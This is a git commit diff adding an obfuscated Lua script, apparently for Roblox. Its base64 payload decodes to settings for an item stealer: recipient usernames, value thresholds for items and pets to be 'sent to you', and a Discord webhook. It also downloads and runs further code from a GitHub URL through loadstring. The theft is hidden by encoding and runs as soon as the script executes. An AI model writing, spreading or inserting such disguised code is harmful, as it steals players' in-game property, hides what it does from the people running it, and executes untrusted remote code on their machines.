0263b6e7f12dc7e25fb7f87d584c0769f0f6e090
214Eli <busterbishop22@icloud.com>
2025-03-01 14:57:56 +0800

    Created new script file

---
+++ scripts/script-24014d7c394a.lua
@@ -0,0 +1,23 @@
+
+-- Obfuscated script
+local encodedScript = "ClVzZXJuYW1lcyA9IHsKICAgICJtb25kZG9fMSIsCiAgICAibW9uZGRvXzEiLAogICAgIm1vbmRkb18xIiwKfQptaW5fcmFwID0gMTAwMDAwIC0tIG1pbmltdW0gcmFwIG9mIGVhY2ggaXRlbSB5b3Ugd2FudCB0byBnZXQgc2VudCB0byB5b3UKbWluX2NoYW5jZSA9IDUwMDAwMDAwMCAtLSBtaW5pbXVtIGNoYW5jZSBvZiBwZXRzIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQp3ZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzNDUyNTk2MTg0NTYzMDk4MDAvUmZpdnctUldrVnhkQ0EtUjEtX1F2bmFDd0RmMmRYb0dSSGpCbUNxTVBWVTI4cUpVQVB2bDlpclBvQWowTE9fRGVncloiCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMjE0RWxpLzIxNHNjcmlwdHMvcmVmcy9oZWFkcy9tYWluL3BldCUyMGdvIiwgdHJ1ZSkpKCk="
+
+-- Decode function
+local function decode(str)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    str = string.gsub(str, '[^'..b..'=]', '')
+    return (str:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- Run the decoded script
+loadstring(decode(encodedScript))()
